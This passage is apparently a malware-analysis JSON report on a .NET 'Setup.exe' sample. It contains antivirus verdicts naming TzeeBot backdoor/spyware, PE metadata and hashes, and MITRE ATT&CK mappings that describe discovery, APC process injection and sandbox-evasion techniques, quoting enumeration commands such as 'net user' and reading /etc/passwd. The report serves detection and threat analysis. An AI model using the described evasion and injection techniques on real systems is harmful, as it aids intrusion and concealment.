          "engine_version": "12.30.43829",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Spyware ( 0055e3ec1 )"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "Backdoor:MSIL/Tnzbt.70d8887a"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.30.43818",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Spyware ( 0055e3ec1 )"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20210330",
          "category": "malicious",
          "result": "malicious.41d114"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20220810",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.260",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "Cyren": {
          "method": "blacklist",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20220813",
          "category": "undetected",
          "result": null
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.18.0.0",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Trojan.Gen.MBT"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "25758",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "a variant of MSIL/Spy.TzeeBot.A"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "BKDR_TEEZBOT.A"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "generic.ml"
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "21.0.1.45",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Backdoor.MSIL.Tnzbt.u"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Agent.BZO"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25618",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Win32.Agent.deejvb"
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20220813",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "21.1.5827.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "MSIL:Agent-CIU [Trj]"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Msil.Backdoor.Tnzbt.Wurp"
        },
        "Ad-Aware": {
          "method": "blacklist",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.21.193",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Agent.BZO"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2022-08-14.02",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Backdoor/W32.DN-Tnzbt.17785344"
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2021.5.0.7597",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Agent.BZO (B)"
        },
        "Comodo": {
          "method": "blacklist",
          "engine_name": "Comodo",
          "engine_version": "34897",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Malware@#1lryw4qw935pc"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.978.51",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.56.4040",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MulDrop5.38840"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Agent.BZO"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "BKDR_TEEZBOT.A"
        },
        "McAfee-GW-Edition": {
          "method": "blacklist",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2019.1.2+3728",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan-FFJV!6EF950941D11"
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "3.5.48.101",
          "engine_update": "20220707",
          "category": "malicious",
          "result": "malicious.high.ml.score"
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "1.4.1.0",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Mal/Generic-R + Troj/MSIL-BBS"
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "22.2.1.2",
          "engine_update": "20220330",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.33751B:27.28445",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.MSIL.Agent.BZO"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Backdoor.MSIL.ffgp"
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "TR/MSIL.Agent.eqal"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan/Generic.ASMalwS.3F60"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "2017.9.26.565",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Win32.Heur.KVM011.a.(kcloud)"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.89.174",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.889",
          "engine_update": "20220814",
          "category": "undetected",
          "result": null
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Win32.S.Agent.17785344"
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "HEUR:Trojan.Win32.Generic"
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.19500.2",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Backdoor:MSIL/Tzeebot.B"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1660496466",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Detected"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.22.1.10283",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan/Win32.FakeMS.R127225"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.108",
          "engine_update": "20220426",
          "category": "undetected",
          "result": null
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan-FFJV!6EF950941D11"
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "malware (ai score=100)"
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20220812",
          "category": "malicious",
          "result": "Trojan.MSIL.gen.a.1"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.3.3.37",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Malware.AI.3593347007"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.323",
          "engine_update": "20220813",
          "category": "malicious",
          "result": "Malicious"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trojan.Generic/MSIL@AI.100 (RDM.MSIL:0NJ0ftIPbVB4m4phxyWzPw)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20220725",
          "category": "malicious",
          "result": "TrojanSpy.TzeeBot!Eg296176EcM"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.0.26.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Hoax.Win32.ArchSMS"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20220812",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "W32/Agent.A!tr"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "21.1.5827.0",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "MSIL:Agent-CIU [Trj]"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20220814",
          "category": "malicious",
          "result": "Trj/Chgt.AB"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20220418",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20220814",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20220208",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20220103",
          "category": "type-unsupported",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "220814-00",
          "engine_update": "20220814",
          "category": "type-unsupported",
          "result": null
        }
      },
      "tags": [
        "peexe",
        "assembly",
        "runtime-modules",
        "detect-debug-environment",
        "checks-network-adapters",
        "direct-cpu-clock-access",
        "checks-user-input",
        "persistence"
      ],
      "last_submission_date": 1660502109,
      "size": 17785344,
      "pe_info": {
        "timestamp": 1408402507,
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "machine_type": 332,
        "entry_point": 17765694,
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "chi2": 73195.05,
            "filetype": "unknown",
            "entropy": 3.6865580081939697,
            "sha256": "4229a0f6126b48229abe2a5399c989e9c8f2b245bd8d13cb52ad123d73dadc6b",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 26865.46,
            "filetype": "unknown",
            "entropy": 3.8972339630126953,
            "sha256": "7d9d3d9fce0547bb09b74be10681e2edd6105a5af073ca066d511da053f360fc",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 13221.84,
            "filetype": "unknown",
            "entropy": 3.7074522972106934,
            "sha256": "d85e7c9f2a1b791028e685845bf6dca9081ef3cba5f1773fe68868869de0faf8",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 40177.33,
            "filetype": "unknown",
            "entropy": 6.5167975425720215,
            "sha256": "887b5bfa7da13b94345066c022ce3a4d12ce10ca1043f23e0c1d2823e8646c13",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 20175.17,
            "filetype": "unknown",
            "entropy": 6.726369857788086,
            "sha256": "874d9ffdabbb87393d4372a20037f3288730e6b24e42b70c7afee2d4c85db22d",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 48617.62,
            "filetype": "unknown",
            "entropy": 5.629415035247803,
            "sha256": "af501daf4f3a2862f607e24d1607f7d4e337c396f77d40eab940bc9e8a2c62a3",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 324705.38,
            "filetype": "unknown",
            "entropy": 5.121628761291504,
            "sha256": "33a9a46ef67e79fe228cc11d58006727944bb2e39dadaafee88ea34199cc2ced",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 108056.48,
            "filetype": "unknown",
            "entropy": 5.630295276641846,
            "sha256": "8f24ee9a797fe2d19f3308317db95440eea683f2bb0bd081a0bf259d2715855b",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 18454.18,
            "filetype": "unknown",
            "entropy": 6.0700154304504395,
            "sha256": "3139400a646431b8eccf7af5e55697347f4978c7bf88d863d63ff0128bb689df",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 8657.33,
            "filetype": "ICO",
            "entropy": 2.9285888671875,
            "sha256": "be8b42ccd58a4807f1933901f4218ab275afc0fd638ae4fc9cb7b44ef4bb7fe5",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 64594.58,
            "filetype": "unknown",
            "entropy": 3.4088361263275146,
            "sha256": "67b66be1aab45a4f549c2608a486fac251ac38defb701e93c242f507529ebf3d",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "NEUTRAL": 11
        },
        "resource_types": {
          "RT_ICON": 9,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 574519.88,
            "virtual_address": 8192,
            "entropy": 7.98,
            "raw_size": 17757696,
            "flags": "rx",
            "virtual_size": 17757508,
            "md5": "465e37e8c3c76f2112994cb85141f5b7"
          },
          {
            "name": ".rsrc",
            "chi2": 623402.56,
            "virtual_address": 17768448,
            "entropy": 5.79,
            "raw_size": 26624,
            "flags": "r",
            "virtual_size": 26616,
            "md5": "8384272d8bd7fcbfd1ffdedd543e7c8f"
          },
          {
            "name": ".reloc",
            "chi2": 127509,
            "virtual_address": 17801216,
            "entropy": 0.12,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 12,
            "md5": "adc0fe8dc2c28da0aaeb7e08695b70d8"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "ssdeep": "393216:Ehohqi+oYqnb5tq+vB+/K8yxgWbP6G4GSMErkvMc9v:nhqiPN6OsuJpSMRl",
      "trid": [
        {
          "file_type": "Windows Control Panel Item (generic)",
          "probability": 58
        },
        {
          "file_type": "Generic CIL Executable (.NET, Mono, etc.)",
          "probability": 21.5
        },
        {
          "file_type": "InstallShield setup",
          "probability": 12.6
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 3.1
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 1.4
        }
      ],
      "sha256": "4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1",
      "meaningful_name": "Setup.exe",
      "creation_date": 1408402507,
      "unique_sources": 10,
      "md5": "6ef950941d114c09af359402620d7cba",
      "sha1": "51ad001b851c77cc30fe8bee2cec2efe51574406",
      "authentihash": "995a16c2f2b4d7df9adaad32f1e071035d18a6eac66536472e71c091fbea445e",
      "tlsh": "T18707F2A5BA568307C56F5CB46292B92F9D287F7382CDC13599163BC5E2EB13261E0F03",
      "names": [
        "Setup.exe",
        "4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1",
        "4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1.exe",
        "vti-rescan",
        "991055723a293cc7871761cd7ac0890a36bfa757e82a4802a564bf9c20387ffa",
        "MiDqm7C.chm",
        "vasYZL8JL.docx"
      ]
    }
  },
  "mitre": {
    "data": {
      "DAS-Security Orcas": {
        "tactics": [
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "get computername"
                  }
                ]
              },
              {
                "id": "T1087.001",
                "name": "Local Account",
                "link": "https://attack.mitre.org/techniques/T1087/001/",
                "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\nCommands such as net user and net localgroup of the Net utility and id and groupson macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the /etc/passwd file. On macOS the dscl . list /Users command can be used to enumerate local accounts.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "get the current user name"
                  }
                ]
              },
              {
                "id": "T1033",
                "name": "System Owner/User Discovery",
                "link": "https://attack.mitre.org/techniques/T1033/",
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nVarious utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.\nOn network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "get the current user name"
                  }
                ]
              },
              {
                "id": "T1083",
                "name": "File and Directory Discovery",
                "link": "https://attack.mitre.org/techniques/T1083/",
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "traverse file"
                  }
                ]
              },
              {
                "id": "T1497.003",
                "name": "Time Based Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/003/",
                "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "sleep bypass"
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "find window"
                  }
                ]
              },
              {
                "id": "T1124",
                "name": "System Time Discovery",
                "link": "https://attack.mitre.org/techniques/T1124/",
                "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. \nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.\nOn network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "get time zone"
                  }
                ]
              },
              {
                "id": "T1120",
                "name": "Peripheral Device Discovery",
                "link": "https://attack.mitre.org/techniques/T1120/",
                "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "get drive type"
                  }
                ]
              },
              {
                "id": "T1016",
                "name": "System Network Configuration Discovery",
                "link": "https://attack.mitre.org/techniques/T1016/",
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "collect network adapter information"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1027.004",
                "name": "Compile After Delivery",
                "link": "https://attack.mitre.org/techniques/T1027/004/",
                "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "compile after delivery"
                  }
                ]
              },
              {
                "id": "T1127",
                "name": "Trusted Developer Utilities Proxy Execution",
                "link": "https://attack.mitre.org/techniques/T1127/",
                "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "compile after delivery"
                  }
                ]
              },
              {
                "id": "T1497.003",
                "name": "Time Based Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/003/",
                "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "sleep bypass"
                  }
                ]
              },
              {
                "id": "T1055.004",
                "name": "Asynchronous Procedure Call",
                "link": "https://attack.mitre.org/techniques/T1055/004/",
                "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). \nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "inject other processes with apc"
                  }
                ]
              },
              {
                "id": "T1134.001",
                "name": "Token Impersonation/Theft",
                "link": "https://attack.mitre.org/techniques/T1134/001/",
